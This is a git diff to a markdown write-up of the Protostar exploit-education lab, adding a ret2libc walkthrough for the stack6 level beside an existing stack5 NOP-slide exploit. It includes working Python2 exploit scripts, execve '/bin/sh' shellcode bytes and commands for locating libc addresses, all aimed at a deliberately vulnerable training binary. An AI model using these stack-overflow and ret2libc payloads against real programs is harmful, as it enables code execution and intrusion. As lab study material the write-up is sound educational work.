@@ -89,7 +89,7 @@ The goal is to smash the stack frame of ```gets``` and redirect the return addre
 4. determine the value of ```eip```: Where to place our shell code? Here we choose to place it right after the position of ```eip```
 5. However, the address space may not be the same every time since the data pushed on the stack can be different (e.g. environment variables). To address this issue, we can find a way to know the exact value by the other code in the binary. However, we can also use NOP(opcode: ```0x90```) slide to make sure that ```eip``` points to the code we control. 
     - make the *eip* point to the middle of the NOP slide
-5. add shellcode: copy from [shell-storm](http://shell-storm.org/shellcode/)
+6. add shellcode: copy from [shell-storm](http://shell-storm.org/shellcode/)
 
 !!! info
     use ```int3```(opcode: ```0xCC```) instruction to debug shellcode
@@ -100,6 +100,7 @@ The goal is to smash the stack frame of ```gets``` and redirect the return addre
     (python exploit.py; cat) | /opt/protostar/bin/stack5
     ```
 
+Python2 Script:
 ```python
 import struct
 
@@ -109,3 +110,48 @@ nopslide = '\x90' * 100
 shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 print padding + eip + nopslide + shellcode
 ```
+
+#### [stack6](https://exploit.education/protostar/stack-six/)
+
+In this task, the return address is restricted so we cannot just set it to an address on the stack. Instead, we take use of the code of ```libc```. The goal is to call ```system()``` with ```/bin/sh``` as the argument. This is a attack method called **ret2libc**.
+
++ How to call ```system()```
+    1. push the argument ("/bin/sh") on the stack
+    2. push the return address on the stack
+    3. jump to ```system```
+
++ Thus, when ```ret``` instruction jump to ```system```, the stack should be as follow:
+    ```
+    -----------------------------
+     return address after system  <---- esp
+    -----------------------------
+         address of "/bin/sh"
+    -----------------------------
+    ```
++ And our buffer overflow should make the stack be as follow:
+    ```
+    -----------------------------
+             padding
+    -----------------------------
+         address of system
+    -----------------------------
+     return address after system 
+    -----------------------------
+         address of "/bin/sh"
+    -----------------------------
+    ```
++ script:
+    ```python
+    import struct
+
+    padding = 'A' * 80
+    system = struct.pack('I', 0xb7ecffb0)
+    return_after_system = 'AAAA'
+    bin_sh = struct.pack('I', 0xb7fb63bf)
+    print padding + system + return_after_system + bin_sh
+    ```
+
++ find the address of ```system```: in GDB type ```p system```
++ find the address of "/bin/sh"
+    1. use environment variables
+    2. find in libc: ```string -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"``` + the start address of libc in the program's memory mapping.
